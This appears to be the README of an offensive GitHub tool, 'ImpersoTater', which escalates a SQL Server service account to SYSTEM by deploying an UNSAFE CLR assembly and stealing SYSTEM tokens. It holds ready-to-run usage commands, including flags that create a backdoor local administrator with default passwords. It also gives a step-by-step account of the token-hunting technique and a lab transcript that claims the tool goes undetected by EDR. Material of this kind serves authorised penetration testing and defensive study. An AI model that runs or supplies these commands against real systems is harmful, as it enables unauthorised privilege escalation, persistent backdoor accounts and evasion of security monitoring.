# ImpersoTater

In-memory privilege escalation from MSSQL service account to `NT AUTHORITY\SYSTEM` via CLR assembly deployment and handle-based token hunting.

No executable is written to disk. The entire payload runs inside `sqlservr.exe` as a CLR stored procedure.

## Install

```
git clone git@github.com:mattmillen15/ImpersoTater.git
cd ImpersoTater
./install.sh
```

This creates a Python venv, installs impacket, installs `mono-mcs` if needed, and creates a `./ImpersoTater` wrapper.

## Usage

```
# Run a command as SYSTEM
./ImpersoTater -t 192.168.15.42 -u sa -p Password1 -c "whoami"

# Impacket-style target string
./ImpersoTater ecorp.local/veeam-admin:'B@ckupP@ssw0rd'@192.168.15.42 -c "whoami /all"

# Create a local admin (default: tater / Imp3rs0T@ter!)
./ImpersoTater -t 10.0.0.5 -u sa -p Password1 --add-user

# Create local admin with custom creds
./ImpersoTater -t 10.0.0.5 -u sa -p Password1 --add-user backdoor:P@ssw0rd!

# Select technique
./ImpersoTater ecorp/admin:Pass@10.0.0.5 -c "whoami" --technique spooler

# Enumerate only (no exploitation)
./ImpersoTater -t 10.0.0.5 -u sa -p Password1 --enum-only

# Leave assembly deployed for multiple commands
./ImpersoTater ecorp/admin:Pass@10.0.0.5 -c "whoami" --no-cleanup
```

### Options

| Flag | Description |
|------|-------------|
| `-t HOST` | Target SQL Server |
| `-P PORT` | Port (default: 1433) |
| `-u USER` | Username |
| `-p PASS` | Password |
| `-d DOMAIN` | Domain for Windows auth |
| `-w` | Force Windows authentication |
| `-c CMD` | Command to execute as SYSTEM |
| `--technique` | `auto`, `spooler`, or `direct` (default: auto) |
| `--add-user [U:P]` | Create local admin (default: `tater` / `Imp3rs0T@ter!`) |
| `--no-cleanup` | Leave CLR assembly deployed |
| `--enum-only` | Only enumerate, don't exploit |

## How It Works

1. **Connect** to MSSQL via impacket TDS using SQL or Windows authentication
2. **Enumerate** the target: SQL version, service account, privileges, Print Spooler status
3. **Compile** C# payload to a .NET Framework DLL using Mono `mcs` on the attacker machine
4. **Deploy** the DLL as a CLR assembly via `CREATE ASSEMBLY FROM 0x...` with `PERMISSION_SET = UNSAFE`
5. **Execute** the CLR stored procedure which:
   - Creates a named pipe and triggers Print Spooler to connect (spooler technique)
   - Impersonates the pipe client to gain initial context
   - Enumerates all system handles via `NtQuerySystemInformation(SystemExtendedHandleInformation)`
   - Duplicates token handles from accessible processes via `NtDuplicateObject`
   - Identifies `S-1-5-18` (SYSTEM) tokens with `SecurityImpersonation` or higher
   - Creates a primary token via `DuplicateTokenEx`
   - Impersonates SYSTEM and creates a child process via `CreateProcessAsUserW`
6. **Clean up** by dropping the stored procedure, assembly, and restoring CLR strict security

## Techniques

### spooler (default when Print Spooler is running)
Creates a named pipe matching the spooler pattern (`\\.\pipe\<random>\pipe\spoolss`) and triggers `OpenPrinterW` to make the Print Spooler connect. The pipe client connection provides impersonation context that enables opening other processes for handle duplication.

### direct
Scans handles without triggering any service. First checks handles in the current process, then attempts to duplicate from other processes. Works when the service account already has sufficient access to open other processes (e.g., when running as `LOCAL SYSTEM` or with `SeDebugPrivilege`).

### auto
Tries `spooler` first (if the Print Spooler service is running), falls back to `direct`.

## Lab Example

```
$ python3 ImpersoTater.py ecorp.local/veeam-admin:'B@ckupP@ssw0rd'@192.168.15.42 -c "whoami && hostname"
[*] Connecting to 192.168.15.42:1433...
[+] Connected

[*] Enumerating target...
    SQL Version: Developer Edition (64-bit) on Windows Server 2019 Datacenter 10.0 <X64>
    Login: ECORP\veeam-admin
    Sysadmin: True
    SeImpersonatePrivilege: True
    Print Spooler: running
    Service Account: nt authority\network service

[*] Deploying CLR assembly...
[+] Compiled CLR assembly (11264 bytes)
[*] Checking prerequisites...
[*] Setting master TRUSTWORTHY ON...
[*] Deploying CLR assembly (11264 bytes)...
[*] Creating stored procedure...
[*] Executing: whoami && hostname
[*] Technique: auto

[+] Result:
[spooler] nt authority\system
ECORP-SQL

[*] Cleaning up...
[+] Cleanup complete
```

Target: SQL Server 2022 Developer Edition on Windows Server 2019 Datacenter, service account `NT AUTHORITY\NETWORK SERVICE`, Elastic Defend enrolled. No files dropped to disk, no processes blocked by EDR.

## Files

| File | Description |
|------|-------------|
| `install.sh` | Setup script — creates venv, installs deps, builds `./ImpersoTater` wrapper |
| `ImpersoTater.py` | Python CLI — connection, compilation, deployment, execution, cleanup |
| `ImpersoTater.cs` | C# payload — handle enumeration, token hunting, process creation |
| `ImpersoTater_sql.cs` | CLR wrapper — SQL stored procedure returning output via TDS |

## Cleanup

By default, the tool removes the CLR assembly and restores `clr strict security` after execution. If `--no-cleanup` is used, manually clean up:

```sql
DROP PROCEDURE dbo.ImpersoTaterExec;
DROP ASSEMBLY ImpersoTaterAsm;
EXEC sp_configure 'clr strict security', 1;
RECONFIGURE;
```
